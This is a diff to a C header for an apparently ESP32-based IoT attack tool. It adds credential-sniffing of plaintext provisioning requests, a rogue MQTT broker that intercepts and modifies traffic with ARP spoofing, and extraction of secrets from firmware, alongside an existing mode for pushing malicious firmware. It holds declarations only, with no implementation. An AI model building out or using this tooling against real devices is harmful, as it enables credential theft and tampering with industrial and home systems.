@@ -71,6 +71,9 @@ typedef enum {
     OTA_MODE_FETCH           = 3,  /* Download firmware from URL              */
     OTA_MODE_POLL_SNIFF      = 4,  /* WiFi sniff for DNS/HTTP OTA polling     */
     OTA_MODE_GITHUB_TAKEOVER = 5,  /* Full chain: broker → URL → repo → push */
+    OTA_MODE_PROVISION_SNIFF = 6,  /* Capture ALL config creds via plain HTTP */
+    OTA_MODE_ROGUE_BROKER    = 7,  /* Full MQTT MITM on port 1883 no TLS      */
+    OTA_MODE_FIRMWARE_ANALYZE= 8,  /* Extract secrets from firmware binaries  */
 } ota_attack_mode_t;
 
 /* ------------------------------------------------------------------ */
@@ -99,13 +102,33 @@ typedef enum {
     OTA_STATE_GH_WAITING_DEVICE,  /* Waiting for device to pull update */
     OTA_STATE_DISCONNECTED,       /* Lost connection                 */
     OTA_STATE_ERROR,              /* Error state                     */
+
+    /* PROVISION_SNIFF states */
+    OTA_STATE_PROV_SNIFFING,      /* Sniffing HTTP provision traffic */
+    OTA_STATE_PROV_HTTP_CAPTURED, /* HTTP POST with creds captured   */
+    OTA_STATE_PROV_CREDS_EXTRACTED,/* All config creds extracted     */
+    OTA_STATE_PROV_WAITING,       /* Waiting for next provision POST */
+
+    /* ROGUE_BROKER states */
+    OTA_STATE_RB_STARTING,        /* Starting rogue MQTT broker      */
+    OTA_STATE_RB_LISTENING,       /* Rogue broker listening on 1883  */
+    OTA_STATE_RB_CLIENT_CONNECTED,/* Target device connected to us   */
+    OTA_STATE_RB_INTERCEPTING,    /* Intercepting MQTT messages      */
+    OTA_STATE_RB_MODIFYING,       /* Modifying MQTT payload in transit*/
+    OTA_STATE_RB_FORWARDING,      /* Forwarding to real broker       */
+
+    /* FIRMWARE_ANALYZE states */
+    OTA_STATE_FW_ANALYZING,       /* Analyzing firmware binary       */
+    OTA_STATE_FW_SCANNING,        /* Scanning for secret patterns    */
+    OTA_STATE_FW_EXTRACTING,      /* Extracting hardcoded secrets    */
+    OTA_STATE_FW_COMPLETE,        /* Analysis complete               */
 } ota_attack_state_t;
 
 /* ------------------------------------------------------------------ */
 /*  Captured MQTT message entry                                        */
 /* ------------------------------------------------------------------ */
 
-#define OTA_MAX_CAPTURED_MSGS    32
+#define OTA_MAX_CAPTURED_MSGS    8 //32
 #define OTA_MAX_PAYLOAD_LEN      512
 #define OTA_MAX_TOPIC_LEN        128
 #define OTA_MAX_URL_LEN          256
@@ -121,11 +144,11 @@ typedef struct {
 /*  Captured URL entry                                                 */
 /* ------------------------------------------------------------------ */
 
-#define OTA_MAX_CAPTURED_URLS    16
-#define OTA_MAX_DNS_ENTRIES     32
-#define OTA_MAX_DNS_NAME_LEN    128
-#define OTA_MAX_HTTP_ENTRIES    16
-#define OTA_MAX_HTTP_URL_LEN    256
+#define OTA_MAX_CAPTURED_URLS    8 //16
+#define OTA_MAX_DNS_ENTRIES     8 //32
+#define OTA_MAX_DNS_NAME_LEN    64
+#define OTA_MAX_HTTP_ENTRIES    4 ///16
+#define OTA_MAX_HTTP_URL_LEN    128
 
 typedef struct {
     char url[OTA_MAX_URL_LEN];
@@ -161,6 +184,108 @@ typedef struct {
     int64_t timestamp_ms;
     bool is_ota_related;                  /* URL matches OTA pattern    */
 } ota_http_entry_t;
+
+/* ------------------------------------------------------------------ */
+/*  Provision Sniffer: Captured config credentials                     */
+/*  The ESP32 provisioning web server sends ALL config via plain HTTP  */
+/*  POST with zero encryption — WiFi SSID, WiFi password, MQTT broker, */
+/*  MQTT username/password, Modbus driver URL, custom time settings.   */
+/* ------------------------------------------------------------------ */
+
+#define OTA_MAX_PROV_CREDS      8
+#define OTA_MAX_CRED_KEY_LEN    32
+#define OTA_MAX_CRED_VALUE_LEN  256
+
+typedef struct {
+    char key[OTA_MAX_CRED_KEY_LEN];       /* e.g. "wifi_ssid", "mqtt_password" */
+    char value[OTA_MAX_CRED_VALUE_LEN];   /* Captured credential value         */
+    char source_ip[16];                    /* Source IP of the HTTP POST        */
+    int64_t timestamp_ms;                  /* When it was captured              */
+    bool is_sensitive;                     /* Password/token/secret field       */
+} ota_prov_cred_t;
+
+typedef struct {
+    char wifi_ssid[33];
+    char wifi_password[64];
+    char mqtt_broker[128];
+    uint16_t mqtt_port;
+    char mqtt_username[64];
+    char mqtt_password[64];
+    char modbus_driver_url[256];
+    char custom_time[32];
+    char device_id[64];
+    char ap_password[64];
+    int total_creds_captured;
+    int sensitive_creds_captured;
+    int64_t first_capture_ms;
+    int64_t last_capture_ms;
+} ota_prov_summary_t;
+
+/* ------------------------------------------------------------------ */
+/*  Rogue Broker: MQTT MITM captured data                              */
+/*  Device connects via mqtt:// port 1883 with no TLS or cert check.   */
+/*  We impersonate the broker — intercept, modify, forward.            */
+/* ------------------------------------------------------------------ */
+
+#define OTA_MAX_MITM_MSGS      8
+#define OTA_MAX_MITM_TOPIC_LEN 64
+#define OTA_MAX_MITM_PAYLOAD_LEN 512
+
+typedef struct {
+    char original_topic[OTA_MAX_MITM_TOPIC_LEN];
+    char original_payload[OTA_MAX_MITM_PAYLOAD_LEN];
+    char modified_topic[OTA_MAX_MITM_TOPIC_LEN];     /* If modified */
+    char modified_payload[OTA_MAX_MITM_PAYLOAD_LEN];  /* If modified */
+    char client_id[64];                               /* Connecting device client ID */
+    bool was_modified;                                 /* Did we alter this message? */
+    bool direction_upload;                             /* true=device->broker, false=broker->device */
+    int64_t timestamp_ms;
+} ota_mitm_entry_t;
+
+typedef struct {
+    char target_client_id[64];
+    char real_broker_ip[128];
+    uint16_t real_broker_port;
+    uint16_t rogue_port;
+    int devices_connected;
+    int messages_intercepted;
+    int messages_modified;
+    int messages_forwarded;
+    bool arp_spoof_active;
+} ota_rogue_broker_summary_t;
+
+/* ------------------------------------------------------------------ */
+/*  Firmware Analysis: Extracted secrets from firmware binary           */
+/*  No firmware encryption or signature verification — we can extract   */
+/*  hardcoded API keys, tokens, certificates, and config structures.    */
+/* ------------------------------------------------------------------ */
+
+#define OTA_MAX_FW_SECRETS     8
+#define OTA_MAX_SECRET_TYPE_LEN 16
+#define OTA_MAX_SECRET_VALUE_LEN 256
+#define OTA_MAX_SECRET_CONTEXT_LEN 32
+
+typedef struct {
+    char type[OTA_MAX_SECRET_TYPE_LEN];    /* "api_key", "token", "cert", "password", "url", "ssid" */
+    char value[OTA_MAX_SECRET_VALUE_LEN];  /* The extracted secret value */
+    char context[OTA_MAX_SECRET_CONTEXT_LEN]; /* Surrounding context/label */
+    uint32_t offset;                       /* Byte offset in firmware */
+    int confidence;                        /* 0-100 confidence score */
+} ota_fw_secret_t;
+
+typedef struct {
+    uint32_t firmware_size;
+    uint32_t secrets_found;
+    uint32_t high_confidence_count;
+    char firmware_sha256[65];
+    bool has_wifi_creds;
+    bool has_mqtt_creds;
+    bool has_api_keys;
+    bool has_certificates;
+    bool has_private_keys;
+    bool has_hardcoded_urls;
+    bool has_modbus_config;
+} ota_fw_analysis_summary_t;
 
 /* ------------------------------------------------------------------ */
 /*  GitHub repo info (parsed from captured URL)                        */
@@ -228,6 +353,25 @@ typedef struct {
     uint8_t *malicious_firmware;             /* Pointer to malicious firmware data   */
     uint32_t malicious_firmware_size;        /* Size of malicious firmware           */
     int gh_captured_url_index;               /* Which captured URL to use (-1 = first GitHub) */
+
+    /* Provision sniff (PROVISION_SNIFF mode) */
+    uint16_t prov_sniff_port;                /* HTTP port to sniff (default 80) */
+    bool     prov_capture_post_only;         /* Only capture POST requests (default true) */
+    bool     prov_auto_parse_json;           /* Auto-parse JSON bodies for creds (default true) */
+
+    /* Rogue broker (ROGUE_BROKER mode) */
+    uint16_t rb_rogue_port;                  /* Port for rogue broker (default 1883) */
+    char     rb_real_broker_ip[128];         /* Real broker IP to forward to */
+    uint16_t rb_real_broker_port;            /* Real broker port (default 1883) */
+    bool     rb_modify_payloads;             /* Modify payloads in transit (default false) */
+    char     rb_modify_topic[128];           /* Topic to modify (empty=all) */
+    char     rb_modify_payload[512];         /* Replacement payload for matching topic */
+    bool     rb_arp_spoof;                   /* Enable ARP spoofing (default true) */
+
+    /* Firmware analysis (FIRMWARE_ANALYZE mode) */
+    int      fw_analyze_url_index;           /* Which captured URL firmware to analyze (-1=last) */
+    bool     fw_deep_scan;                   /* Deep scan for all patterns (default true) */
+    bool     fw_extract_strings;             /* Extract all printable strings (default true) */
 
     /* General */
     uint32_t timeout_sec;           /* Auto-stop timeout (default 300) */
@@ -360,5 +504,90 @@ const char *ota_attack_get_github_repo_json(void);
 
 /** Get the last GitHub API operation result as JSON. */
 const char *ota_attack_get_github_result_json(void);
+
+/* ------------------------------------------------------------------ */
+/*  Provision Sniffer API                                              */
+/*  Captures ALL config creds (WiFi, MQTT, Modbus) from the ESP32      */
+/*  provisioning web server which uses plain HTTP with zero encryption. */
+/* ------------------------------------------------------------------ */
+
+/** Get captured provision credentials as JSON string.
+ *  Returns all key-value pairs captured from HTTP POST requests. */
+const char *ota_attack_get_prov_creds_json(void);
+
+/** Get a summary of all captured provision credentials.
+ *  Fills in the summary structure with organized credential data. */
+void ota_attack_get_prov_summary(ota_prov_summary_t *out);
+
+/** Get provision summary as JSON string. */
+const char *ota_attack_get_prov_summary_json(void);
+
+/** Get count of captured provision credentials. */
+uint32_t ota_attack_get_prov_cred_count(void);
+
+/** Get count of sensitive (password/token) credentials captured. */
+uint32_t ota_attack_get_prov_sensitive_count(void);
+
+/** Clear all captured provision credentials. */
+void ota_attack_clear_prov_creds(void);
+
+/* ------------------------------------------------------------------ */
+/*  Rogue Broker API                                                   */
+/*  Full MQTT MITM — device connects via mqtt:// port 1883 with no     */
+/*  TLS/cert verification. We intercept, modify, and forward.          */
+/* ------------------------------------------------------------------ */
+
+/** Get intercepted MQTT MITM messages as JSON string. */
+const char *ota_attack_get_mitm_messages_json(void);
+
+/** Get rogue broker summary (connections, messages, modifications). */
+void ota_attack_get_rogue_broker_summary(ota_rogue_broker_summary_t *out);
+
+/** Get rogue broker summary as JSON string. */
+const char *ota_attack_get_rogue_broker_summary_json(void);
+
+/** Dynamically set a topic payload modification rule.
+ *  All subsequent messages on matching topic will be replaced.
+ *  Only works while ROGUE_BROKER mode is active. */
+bool ota_attack_set_mitm_modify_rule(const char *topic, const char *new_payload);
+
+/** Get count of intercepted MQTT messages. */
+uint32_t ota_attack_get_mitm_count(void);
+
+/** Get count of modified MQTT messages. */
+uint32_t ota_attack_get_mitm_modified_count(void);
+
+/** Clear all intercepted MITM messages. */
+void ota_attack_clear_mitm_messages(void);
+
+/* ------------------------------------------------------------------ */
+/*  Firmware Analysis API                                              */
+/*  Extracts hardcoded secrets from any downloaded firmware binary      */
+/*  because there's no firmware encryption or signature verification.   */
+/* ------------------------------------------------------------------ */
+
+/** Analyze the currently downloaded firmware binary for secrets.
+ *  If firmware_buffer has data, scans it for hardcoded credentials,
+ *  API keys, tokens, certificates, and configuration structures.
+ *  Returns number of secrets found. */
+int ota_attack_analyze_firmware(void);
+
+/** Get extracted firmware secrets as JSON string. */
+const char *ota_attack_get_fw_secrets_json(void);
+
+/** Get firmware analysis summary. */
+void ota_attack_get_fw_analysis_summary(ota_fw_analysis_summary_t *out);
+
+/** Get firmware analysis summary as JSON string. */
+const char *ota_attack_get_fw_analysis_summary_json(void);
+
+/** Get count of extracted firmware secrets. */
+uint32_t ota_attack_get_fw_secret_count(void);
+
+/** Get count of high-confidence firmware secrets. */
+uint32_t ota_attack_get_fw_high_confidence_count(void);
+
+/** Clear all extracted firmware secrets. */
+void ota_attack_clear_fw_secrets(void);
 
 #endif /* OTA_ATTACK_H */
